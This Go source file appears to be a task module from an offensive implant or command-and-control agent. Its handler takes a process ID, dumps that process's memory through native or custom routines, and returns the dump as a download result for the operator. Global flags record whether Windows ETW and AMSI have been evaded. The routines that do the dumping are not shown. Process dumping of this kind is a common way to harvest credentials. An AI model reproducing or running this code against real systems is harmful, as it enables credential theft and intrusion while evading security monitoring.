package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"fmt"
	"strconv"
)

var etwEvaded bool

var amsiEvaded bool

type Task struct {
	TaskId string `json:"taskid"`
	Pid    string `json:"pid"`
	Method string `json:"method"`

	// General Purpose
	status   string
	tasktype string
}

func InitialiseTask(task *Task) error {
	task.tasktype = "respdownload"
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {

	pid, err := strconv.Atoi(task.Pid)
	if err != nil {
		fmt.Println("Error Occured with pid --> ", err.Error())
		task.status = "failed"
		return nil, err
	}
	fmt.Println("Procdump started")
	switch task.Method {
	case "native":
		stdout, err = procdump_native(pid)
		if err != nil && err.Error() != "The operation completed successfully." {
			fmt.Println("Error Occured --> ", err.Error())
			task.status = "failed"
			return nil, err
		}
	default:
		stdoutProc, err := dumpProcess(int32(pid))
		fmt.Println("Procdump completed")
		if err != nil {
			fmt.Println("Error Occured --> ", err.Error())
			task.status = "failed"
			return nil, err
		}
		stdout = stdoutProc.Data()
	}
	task.status = "completed"
	return stdout, err
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
